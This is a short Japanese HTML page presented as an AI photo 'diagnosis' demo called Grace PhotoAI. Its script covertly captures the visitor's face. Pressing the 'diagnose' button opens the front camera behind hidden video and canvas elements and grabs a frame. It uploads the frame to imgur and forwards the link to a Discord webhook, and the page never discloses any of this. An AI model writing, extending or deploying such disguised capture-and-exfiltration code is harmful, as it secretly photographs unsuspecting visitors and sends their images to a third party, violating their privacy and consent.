<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Grace PhotoAI — 自動撮影デモ</title>
  <style>
    body { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; }
    video, canvas { display: none; }
    .main-button { /* 今までのボタンスタイル */ }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button class="main-button" id="shootBtn">診断する</button>

  <!-- カメラ映像（不要ならdisplay:noneのままでOK） -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video   = document.getElementById('video');
    const canvas  = document.getElementById('canvas');
    const shootBtn = document.getElementById('shootBtn');

    // 前面カメラを指定してストリーム取得
    async function startCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' }, audio: false
      });
      video.srcObject = stream;
      await new Promise(r => video.onloadedmetadata = r);
      return stream;
    }

    // ビデオの１フレームをキャプチャしてBase64を返す
    function captureImage() {
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      return canvas.toDataURL('image/jpeg').split(',')[1]; // Base64 部分だけ
    }

    shootBtn.addEventListener('click', async () => {
      try {
        // 1) カメラ起動  
        const stream = await startCamera();

        // 2) 即時キャプチャ
        const base64Image = captureImage();

        // 3) カメラ停止
        stream.getTracks().forEach(t => t.stop());

        // 4) あとはimgur→Discord送信は今まで通り  
        fetch('https://api.imgur.com/3/image', {
          method: 'POST',
          headers: { Authorization: `Client-ID 6e1b6bf28c5da0e`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: base64Image, type: 'base64' })
        })
        .then(res => res.json())
        .then(json => {
          const imageUrl = json.data.link;
          return fetch('https://discord.com/api/webhooks/…', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `画像をアップロード\n${imageUrl}` })
          });
        })
        .catch(console.error);

      } catch (e) {
        console.error('カメラ取得エラー:', e);
      }
    });
  </script>
</body>
</html>
